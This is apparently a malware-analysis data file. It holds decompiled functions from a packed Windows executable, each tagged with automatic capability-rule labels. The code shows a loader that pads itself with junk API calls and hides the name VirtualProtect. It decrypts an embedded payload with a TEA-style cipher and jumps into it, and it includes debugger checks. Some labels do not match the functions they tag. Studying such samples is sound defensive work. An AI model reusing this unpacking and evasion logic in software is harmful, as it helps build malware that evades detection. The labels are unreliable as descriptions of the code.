{
    "00401000": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_448h\n\nvoid __cdecl fcn.00401000(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint var_448h;\n    uint var_48h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    // [00] -r-x section size 20480 named .text\n    var_34h = *0x409418 ^ &stack0xfffffffc;\n    var_14h = -0x3910c8e0;\n    var_2ch = *arg_8h;\n    var_10h = arg_8h[1];\n    var_24h = -0x61c88647;\n    var_ch = *arg_ch;\n    var_28h = arg_ch[1];\n    var_1ch = arg_ch[2];\n    var_18h = arg_ch[3];\n    var_20h = var_24h;\n    var_8h = var_14h;\n    for (var_4h = 0; var_4h < 0x20; var_4h = var_4h + 1) {\n        if (0x1849 < var_4h) {\n            (*_sym.imp.GDI32.dll_GetPolyFillMode)(0);\n        }\n        var_10h = var_10h - (var_2ch * 0x10 + var_1ch ^ var_2ch + var_14h ^ (var_2ch >> 5) + var_18h);\n        if (0x249 < var_4h) {\n            (*_sym.imp.KERNEL32.dll_PeekConsoleInputA)(0, &var_48h, 0, &var_30h);\n            (*_sym.imp.USER32.dll_InsertMenuItemA)(0, 0, 0, 0);\n        }\n        var_2ch = var_2ch - (var_10h * 0x10 + var_ch ^ var_10h + var_14h ^ (var_10h >> 5) + var_28h);\n        if (var_4h < 0xe61) {\n            (*_sym.imp.ole32.dll_OleSetMenuDescriptor)(0, 0, 0, 0, 0);\n            (*_sym.imp.GDI32.dll_CheckColorsInGamut)(0, 0, &var_448h, 0);\n        }\n        var_14h = var_14h - var_24h;\n    }\n    *arg_8h = var_2ch;\n    arg_8h[1] = var_10h;\n    fcn.004019ae(var_448h);\n    return;\n}\n",
        "token_count": 698
    },
    "0040115b": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040115b(int32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    for (var_8h = 0; var_8h < arg_ch >> 3; var_8h = var_8h + 1) {\n        if (0x178fbb < var_8h) {\n            (*_sym.imp.USER32.dll_CreateMDIWindowW)(0x406444, L\"bikugikijabe\", 0, 0, 0, 0, 0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringW)\n                      (L\"sogutuyozukonipihowusocegu\", \n                       L\"tosixu xacojofodagoluhitokihonizezige sojevilohamocugorozotahujamiju\", \n                       L\"rukukiyipucajetutolorubewo mapebokazumigesakukixoyefepuwa\", \n                       L\"hujecugetutunivileraluwafujo joxarukulurazapuneku cedolapeduboji\");\n        }\n        fcn.00401000(arg_8h + var_8h * 8, arg_10h);\n        if (0x33e613 < var_8h) {\n            (*_sym.imp.GDI32.dll_LineDDA)(0, 0, 0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_WriteProfileSectionW)\n                      (L\"rehebetajedaraguluyodawo hura\", L\"curemaxojosewu majamepozo teramexizosima\");\n        }\n    }\n    return;\n}\n",
        "token_count": 421
    },
    "null": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid main(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t in_FS_OFFSET;\n    code *arg_8h;\n    uint var_78ch;\n    uint var_784h;\n    char *var_780h;\n    uint *var_779h;\n    int32_t var_770h;\n    uint var_76ch;\n    uint var_768h;\n    int32_t var_368h;\n    uint32_t var_364h;\n    int32_t var_360h;\n    int32_t var_35ch;\n    uint var_358h;\n    uint var_304h;\n    int32_t var_2fch;\n    uint var_2f8h;\n    uint var_1ach;\n    uint var_190h;\n    int32_t var_bch;\n    int32_t var_a8h;\n    int32_t var_a4h;\n    int32_t var_9ch;\n    uint lpCmdLine;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint lpFileName;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = *0x409418 ^ &stack0xfffffffc;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (iVar2 == 0x28324) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(0x409f20);\n        if (iVar2 == 0x1c279) {\n            var_780h = 0x409f20;\n            do {\n                cVar1 = *var_780h;\n                var_780h = var_780h + 1;\n            } while (cVar1 != '\\0');\n            if (var_780h == 0x4cfafd) {\n                puVar3 = \n                \"keluxepuvemira zelerinekabatigisojero jezotolupasisulimurimejozu zuyuwakocapavayifirebiguheyi ve\";\n                puVar4 = &lpCmdLine;\n                for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                *puVar4 = *puVar3;\n                (*_sym.imp.KERNEL32.dll_WinExec)(&lpCmdLine, 0);\n                (*_sym.imp.KERNEL32.dll_LoadModule)(0, 0);\n                puVar3 = L\"hemesuju ni\";\n                puVar4 = &lpFileName;\n                for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                (*_sym.imp.KERNEL32.dll_CreateFileW)(&lpFileName, 0, 0, 0, 0, 0, 0);\n                unique0x00001e00 = &var_779h;\n                var_30h = 0;\n                var_2ch = 0;\n                var_28h = 0;\n                fcn.0040181d();\n                fcn.004019bd(0);\n                (*_sym.imp.ADVAPI32.dll_ReportEventA)(0, 0, 0, 0, 0, 0, 0, 0, 0);\n                fcn.00401862();\n            }\n        }\n    }\n    var_9ch = 0;\n    do {\n        if (0xe3df6 < var_9ch) {\ncode_r0x0040146a:\n            for (var_2fch = 0; var_2fch < 0x13071; var_2fch = var_2fch + 1) {\n                if (var_2fch < 0x13c) {\n                    (*_sym.imp.ole32.dll_OleMetafilePictFromIconAndLabel)(0, 0, 0, 0);\n                    puVar3 = L\"Ji sohorabe nuserevatakenevagumegeda\";\n                    puVar4 = &var_358h;\n                    for (iVar2 = 0x12; iVar2 != 0; iVar2 = iVar2 + -1) {\n                        *puVar4 = *puVar3;\n                        puVar3 = puVar3 + 1;\n                        puVar4 = puVar4 + 1;\n                    }\n                    *puVar4 = *puVar3;\n                    (*_sym.imp.GDI32.dll_GetTextExtentPointW)(0, &var_358h, 0, &var_304h);\n                    (*_sym.imp.USER32.dll_GetDC)(0);\n                }\n                if (var_2fch == 0xd464) {\n                    *0x40a304 = *0x409410;\n                }\n                if (var_2fch < 0x145) {\n                    (*_sym.imp.KERNEL32.dll_FindVolumeMountPointClose)(0);\n                }\n            }\n            for (var_35ch = 0; var_35ch < 0x1793e; var_35ch = var_35ch + 1) {\n                if (var_35ch < 0x3f) {\n                    (*_sym.imp.USER32.dll_ReplyMessage)(0);\n                    (*_sym.imp.GDI32.dll_Ellipse)(0, 0, 0, 0, 0);\n                }\n                if (var_35ch == 0x10f4a) {\n                    *0x40a304 = *0x40a304 + 0xbeca0;\n                }\n                if (var_35ch < 0x271) {\n                    (*_sym.imp.USER32.dll_SetClassLongA)(0, 0, 0);\n                    (*_sym.imp.GDI32.dll_GetTextMetricsA)(0, 0);\n                }\n            }\n            for (var_360h = 0; var_360h < 0x947192; var_360h = var_360h + 1) {\n                if (var_360h < 0x26ed) {\n                    (*_sym.imp.KERNEL32.dll_SetEvent)(0);\n                    (*_sym.imp.USER32.dll_DrawAnimatedRects)(0, 0, 0, 0);\n                }\n                if (var_360h == 0x48fc5d) {\n                    *0x40a26c = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0, *0x40a304);\n                }\n            }\n            *0x40aab4 = *0x409404;\n            for (var_364h = 0; var_364h < *0x40a304; var_364h = var_364h + 1) {\n                if (var_364h < 0xad6) {\n                    (*_sym.imp.GDI32.dll_CreateRoundRectRgn)(0, 0, 0, 0, 0, 0);\n                    (*_sym.imp.KERNEL32.dll_SetTapeParameters)(0, 0, 0);\n                    (*_sym.imp.USER32.dll_GetWindowTextLengthW)(0);\n                    (*_sym.imp.USER32.dll_CloseWindow)(0);\n                    (*_sym.imp.USER32.dll_SetWindowsHookW)(0, 0);\n                }\n                (*0x40a26c)[var_364h] = *(*0x40aab4 + var_364h + 0xbeca0);\n                if (var_364h < 0x622) {\n                    (*_sym.imp.KERNEL32.dll_LocalLock)(0);\n                }\n            }\n            var_4h = 0x40;\n            for (var_368h = 0; var_368h < 0x276b9f; var_368h = var_368h + 1) {\n                if (var_368h < 0x22ae) {\n                    (*_sym.imp.GDI32.dll_GetDeviceGammaRamp)(0, 0);\n                    (*_sym.imp.USER32.dll_GetWindowTextA)(0, &var_768h, 0);\n                }\n                if (var_368h == 0x260d26) {\n                    *0x40a300 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"kernel32.dll\");\n                    (*_sym.imp.KERNEL32.dll_lstrcpyA)(0x409f20, \"Virtual\");\n                    (*_sym.imp.KERNEL32.dll_lstrcatA)(0x409f20, \"Protect\");\n                    *0x40a268 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x40a300, 0x409f20);\n                    (**0x40a268)(*0x40a26c, *0x40a304, var_4h, &var_76ch);\n                }\n                if (var_368h < 0x893) {\n                    (*_sym.imp.KERNEL32.dll_GetDriveTypeW)\n                              (\n                              L\"gupegaleheruwagobukiredexuvuwa jeyowujovutuzudiposuxezoyiru dipufopicivehopowegigoreriveke karisaruginilevusubonaxiwiyo vizicese\"\n                              );\n                }\n            }\n            arg_8h = *0x40a26c;\n            fcn.0040115b(*0x40a26c, *0x40a304, 0x409000);\n            for (var_770h = 0; var_770h < 0x72791a; var_770h = var_770h + 1) {\n                if (0x25c6059d < var_770h) {\n                    (*_sym.imp.ole32.dll_CoInitialize)(0);\n                }\n                if (var_770h == 0x3458be) {\n                    *0x40a304 = *0x40a304 + 0x6328d06a;\n                    (**0x40a26c)();\n                }\n            }\n            *(*(*(in_FS_OFFSET + 0x2c) + *0x40aab8 * 4) + 4) = 1;\n            (*_sym.imp.USER32.dll_LoadCursorW)\n                      (0, L\"hizujizayonizinukisihinitu fatotovohewimipuzigovujozi luwibaduyoxitijigudesu\");\n            fcn.004019ae(arg_8h);\n            return;\n        }\n        if (var_9ch < 0x2f9) {\n            (*_sym.imp.USER32.dll_GrayStringA)(0, 0, 0, 0, 0, 0, 0, 0, 0);\n        }\n        (*_sym.imp.KERNEL32.dll_SetSystemTimeAdjustment)(0, 0);\n        if (var_9ch < 0x197) {\n            puVar3 = L\"keyupocunucipojafiyayama zu pinonebazahinoja gohoxogamekixitunodolekoxosi zeveke\";\n            puVar4 = &var_190h;\n            for (iVar2 = 0x28; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            *puVar4 = *puVar3;\n            (*_sym.imp.USER32.dll_AppendMenuW)(0, 0, 0, &var_190h);\n        }\n        (*_sym.imp.USER32.dll_ClientToScreen)(0, 0);\n        if (var_9ch < 0x186) {\n            (*_sym.imp.KERNEL32.dll_InitAtomTable)(0);\n            puVar3 = \"cecudixetixakehereseyeta\";\n            puVar4 = &var_1ach;\n            for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            *puVar4 = *puVar3;\n            (*_sym.imp.USER32.dll_SetPropA)(0, &var_1ach, 0);\n        }\n        (*_sym.imp.KERNEL32.dll_GetFileType)(0);\n        if (var_9ch < 0x587) {\n            (*_sym.imp.KERNEL32.dll_DebugBreakProcess)(0);\n        }\n        if ((((0x6dc < var_9ch) && (var_a8h != 0x226f941)) && (var_a4h != 0x5d3667a9)) && (var_bch != 0x64e861b5)) {\n            (*_sym.imp.USER32.dll_GetInputState)();\n            (*_sym.imp.GDI32.dll_GetLogColorSpaceA)(0, &var_2f8h, 0);\n            goto code_r0x0040146a;\n        }\n        var_9ch = var_9ch + 1;\n    } while( true );\n}\n",
        "token_count": 2964
    },
    "00401862": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_2h\n\nvoid __fastcall fcn.00401862(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_2h;\n    \n    var_1ch = param_1;\n    if (*param_1 != 0) {\n        iVar1 = param_1[1];\n        for (var_8h = *param_1; var_8h != iVar1; var_8h = var_8h + 0x1c) {\n            var_1ch = var_1ch + 3;\n            fcn.004018ef(var_1ch, var_8h);\n        }\n        fcn.00401a00(*var_1ch, var_1ch, (var_1ch[2] - *var_1ch) / 0x1c);\n    }\n    *var_1ch = 0;\n    var_1ch[1] = 0;\n    var_1ch[2] = 0;\n    return;\n}\n",
        "token_count": 310
    },
    "00401921": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401921(uint arg_8h, int32_t arg_ch)\n\n{\n    uint arg_ch_00;\n    uint *in_ECX;\n    uint *var_14h;\n    uint var_10h;\n    uint var_9h;\n    uint var_4h;\n    \n    if ((arg_8h != '\\0') && (0xf < in_ECX[5])) {\n        arg_ch_00 = *in_ECX;\n        if (arg_ch != 0) {\n            fcn.00401a10(in_ECX, arg_ch_00, arg_ch);\n        }\n        fcn.00401a00(arg_ch_00);\n    }\n    in_ECX[5] = 0xf;\n    in_ECX[4] = arg_ch;\n    var_14h = in_ECX;\n    if (0xf < in_ECX[5]) {\n        var_14h = *in_ECX;\n    }\n    *(var_14h + arg_ch) = 0;\n    return;\n}\n",
        "token_count": 225
    },
    "004019ae": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004019ae(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x409418) {\n        return;\n    }\n    *0x40abe0 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x40abe4 = &arg_8h;\n    *0x40ab20 = 0x10001;\n    *0x40aac8 = 0xc0000409;\n    *0x40aacc = 1;\n    var_328h = *0x409418;\n    var_324h = *0x40941c;\n    *0x40aad4 = unaff_retaddr;\n    *0x40abac = in_GS;\n    *0x40abb0 = in_FS;\n    *0x40abb4 = in_ES;\n    *0x40abb8 = in_DS;\n    *0x40abbc = unaff_EDI;\n    *0x40abc0 = unaff_ESI;\n    *0x40abc4 = unaff_EBX;\n    *0x40abc8 = in_EDX;\n    *0x40abcc = in_ECX;\n    *0x40abd0 = in_EAX;\n    *0x40abd4 = unaff_EBP;\n    *0x40abd8 = unaff_retaddr;\n    *0x40abdc = in_CS;\n    *0x40abe8 = in_SS;\n    *0x40ab18 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040354a(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x4067bc);\n    if (*0x40ab18 == 0) {\n        fcn.0040354a(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 823
    },
    "004019bd": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004019bd(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x40adec, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.00402059();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.00402017(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "00402330": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00402436: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0040243b)\n// WARNING: Removing unreachable block (ram,0x0040246a)\n// WARNING: Removing unreachable block (ram,0x00402441)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00402330(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004032c0(0x407f40, 0x20);\n    fcn.004038b0(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x40ae20 != 1) {\n        *0x40ae1c = 1;\n        *0x40ae18 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x40b948);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x40b944);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.00402e3f();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.00402e3f();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x40b948);\n                        piVar2 = (*pcVar1)(*0x40b944);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x4061d4;\n            while (*(unaff_EBP + -0x1c) < 0x4061d8) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x4061dc;\n        while (*(unaff_EBP + -0x20) < 0x4061e0) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.004037d7(8);\n    }\n    return;\n}\n",
        "token_count": 1018
    },
    "00403aac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00403aac(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.004037d7(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "00403e7b": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403e7b(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x409418 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.00402e3f();\n    var_14h = 0;\n    if (*0x40b7e8 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"USER32.DLL\");\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"MessageBoxW\"), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x00403fd8;\n        *0x40b7e8 = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, \"GetActiveWindow\");\n        *0x40b7ec = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetLastActivePopup\");\n        *0x40b7f0 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetUserObjectInformationW\");\n        *0x40b7f8 = (*pcVar4)(uVar3);\n        if (*0x40b7f8 != 0) {\n            uVar3 = (*pcVar6)(iVar1, \"GetProcessWindowStation\");\n            *0x40b7f4 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x40b7f4 == var_18h) || (*0x40b7f8 == var_18h)) {\ncode_r0x00403f87:\n        if ((((*0x40b7ec != var_18h) && (pcVar4 = (*pcVar6)(*0x40b7ec),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x40b7f0 != var_18h && (pcVar4 = (*pcVar6)(*0x40b7f0),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x40b7f4);\n        pcVar5 = (*pcVar6)(*0x40b7f8);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x00403f87;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x40b7e8);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x00403fd8:\n    fcn.004019ae(unaff_EBX);\n    return;\n}\n",
        "token_count": 957
    },
    "004018fe": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401914)\n\nvoid __cdecl fcn.004018fe(uint arg_8h)\n\n{\n    fcn.00401921(1, 0);\n    return;\n}\n",
        "token_count": 49
    },
    "00404f7d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f7d(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.004019bd(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0040181d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040181d(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    if (*param_1 != param_1[1]) {\n        fcn.004018ef(param_1 + 3, param_1[1] + -0x1c);\n        param_1[1] = param_1[1] + -0x1c;\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "00402470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402470(uint arg_8h)\n\n{\n    fcn.00402330(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 39
    },
    "00402df3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402e07)\n// WARNING: Removing unreachable block (ram,0x00402e0d)\n// WARNING: Removing unreachable block (ram,0x00402e0f)\n\nvoid fcn.00402df3(void)\n\n{\n    return;\n}\n",
        "token_count": 66
    }
}